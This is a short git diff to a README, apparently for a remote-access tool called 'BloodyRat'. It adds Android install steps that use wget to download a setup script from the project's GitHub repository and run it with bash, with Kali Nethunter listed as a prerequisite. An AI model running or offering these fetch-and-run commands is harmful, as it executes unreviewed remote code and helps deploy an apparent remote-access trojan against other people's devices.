@@ -87,6 +87,11 @@ Android | Support
 ---
 
 ### Android <img src="https://tenor.com/view/droidcon-synesthesia-android-gif-18815626.gif" alt="Instagram" width="80" height="50" >
+
+#### Prerequisite:- [**Nethunter**](https://github.com/Bhaviktutorials/Kali-Nethunter)
+#### <p align="center"> ```wget -N https://github.com/Bhaviktutorials/BloodyRat/raw/main/setup```
+#### <p align="center"> ``` bash setup```
+
 ---
 ### Cloud Shell <img src="https://tenor.com/view/sky-cloud-airspace-art-logo-gif-16713393.gif" alt="Instagram" width="80" height="50" >
 ## <p align="center"> [![Open in Cloud Shell](https://user-images.githubusercontent.com/27065646/92304704-8d146d80-ef80-11ea-8c29-0deaabb1c702.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/Bhaviktutorials/BloodyRat&tutorial=README.md)
